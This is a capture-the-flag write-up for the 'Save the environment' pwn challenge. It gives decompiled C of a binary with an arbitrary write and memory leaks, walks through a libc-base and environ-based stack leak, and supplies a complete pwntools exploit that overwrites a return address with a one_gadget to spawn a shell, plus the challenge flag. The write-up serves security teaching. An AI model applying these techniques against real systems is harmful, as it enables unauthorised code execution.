# Save the environment

## Challenge

The program allows us to plant a tree with a specified type and location, or recycle.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

If we look at the `plant` function, we'll see that it actually gives us an arbitrary 8-byte write.

```c
void sym.plant(undefined8 param_1, int64_t param_2, int64_t param_3, int64_t param_4, int64_t param_5,
              undefined8 param_6, undefined8 param_7, undefined8 param_8)
{
    undefined8 *arg_10h;
    undefined8 uVar1;
    int64_t in_RCX;
    int64_t arg3;
    int64_t arg3_00;
    int64_t in_R8;
    int64_t in_R9;
    int64_t in_FS_OFFSET;
    int64_t iVar2;
    int64_t var_50h;
    undefined8 var_48h;
    char *str;
    char *buf;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    iVar2 = sym.check_fun((uint64_t)_obj.rec_count);
    sym.color(iVar2, param_2, param_3, param_4, param_5, param_6, param_7, param_8, 
              "\nTrees will provide more oxygen for us.\nWhat do you want to plant?\n\n1. 🌴\n\n2. 🌳\n", "green", 
              arg3, in_RCX, in_R8, in_R9, var_50h);
    sym..plt.got(0x401aae);
    sym.imp.read(0, &str, 0x10);
    arg_10h = (undefined8 *)sym.imp.strtoull(&str, 0, 0);
    iVar2 = sym.imp.putchar(10);
    sym.color(iVar2, param_2, param_3, param_4, param_5, param_6, param_7, param_8, 
              "Where do you want to plant?\n1. City\n2. Forest\n", "green", arg3_00, in_RCX, in_R8, in_R9, 
              (int64_t)arg_10h);
    sym..plt.got(0x401aae);
    sym.imp.read(0, &buf, 0x10);
    sym.imp.puts("Thanks a lot for your contribution!");
    uVar1 = sym.imp.strtoull(&buf, 0, 0);
    *arg_10h = uVar1;
    _obj.rec_count = 0x16;
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        sym.imp.__stack_chk_fail();
    }
    _obj.rec_count = 0x16;
    return;
}
```

If we look within the `recycle` function, we'll find a `form` function called within:

```c
void sym.form(int64_t param_1, int64_t param_2, int64_t param_3, int64_t param_4, int64_t param_5, undefined8 param_6,
             undefined8 param_7, undefined8 param_8, undefined8 param_9, undefined8 param_10, int64_t param_11,
             int64_t param_12, int64_t param_13, int64_t param_14)
{
    undefined8 uVar1;
    int64_t arg3;
    int64_t in_FS_OFFSET;
    int64_t arg7;
    int64_t s;
    void *buf;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    buf._0_4_ = 0;
    sym.color(param_1, param_2, param_3, param_4, param_5, param_6, param_7, param_8, 
              "Is this your first time recycling? (y/n)\n> ", "magenta", param_11, param_12, param_13, param_14, s);
    sym.imp.read(0, &buf, 3);
    arg7 = sym.imp.putchar(10);
    if (((char)buf == 'n') || ((char)buf == 'N')) {
        _obj.rec_count = _obj.rec_count + 1;
    }
    if (_obj.rec_count < 5) {
        sym.color(arg7, param_2, param_3, param_4, param_5, param_6, param_7, param_8, 
                  "Thank you very much for participating in the recycling program!\n", "magenta", arg3, param_12, 
                  param_13, param_14, s);
    } else {
        if (_obj.rec_count < 10) {
            sym.color(arg7, param_2, param_3, param_4, param_5, param_6, param_7, param_8, 
                      "You have already recycled at least 5 times! Please accept this gift: ", "magenta", arg3, param_12
                      , param_13, param_14, s);
            sym..plt.got("[%p]\n", _reloc.printf);
        } else {
            if (_obj.rec_count == 10) {
                sym.color(arg7, param_2, param_3, param_4, param_5, param_6, param_7, param_8, 
                          "You have recycled 10 times! Feel free to ask me whatever you want.\n> ", "cyan", arg3, 
                          param_12, param_13, param_14, s);
                sym.imp.read(0, (int64_t)&buf + 4, 0x10);
                uVar1 = sym.imp.strtoull((int64_t)&buf + 4, 0, 0);
                sym.imp.puts(uVar1);
            }
        }
    }
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        sym.imp.__stack_chk_fail();
    }
    return;
}
```

This function rewards us after 5 recycles with a leak of the address of the `printf` function.
After another 5 recycles, we get 1 leak of memory at an arbitrary address of our choosing.

Using the first leak, we can get the base address of libc.

Using the second leak, since we know where libc is mapped, we can leak the pointer to environment variables.

The location of environment variables is a known distance from out call stack, so we now know where return addresses are.
We can now use the arbitrary write from the `plant` function to return to a one gadget and spawn a shell.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 environment
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('environment')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

for i in range(5):
    io.recvuntil(">")
    io.sendline("2")
    io.recvuntil(">")
    io.sendline("2")
    io.recvuntil(">")
    io.sendline("n")

io.recvuntil("gift: \x1b[0m[")
leak0 = io.recvuntil("]", drop=True)
libc.address = int(leak0, 0) - libc.sym["printf"]
io.success("libc: {}".format(hex(libc.address)))

stackptr = libc.address + (0x7f951407e5a0 - 0x7f9513c8e000)

for i in range(5):
    io.recvuntil(">")
    io.sendline("2")
    io.recvuntil(">")
    io.sendline("2")
    io.recvuntil(">")
    io.sendline("n")

io.recvuntil(">")
io.sendline(str(stackptr))

io.recvuntil("\x1b[0m")
leak1 = io.recvuntil("\n", drop=True)

stack = u64(leak1.ljust(8, b'\x00')) - (0x7ffe64ffb388 - 0x7ffe64ffb278)
io.success("stack: {}".format(hex(stack)))

one_gadget = libc.address + 0x4f3d5

io.recvuntil(">")
io.sendline("1")
io.recvuntil(">")
io.sendline(str(stack))
io.recvuntil(">")
io.sendline(str(one_gadget))

io.interactive()
```

## Flag

`CHTB{u_s4v3d_th3_3nv1r0n_v4r14bl3!}`

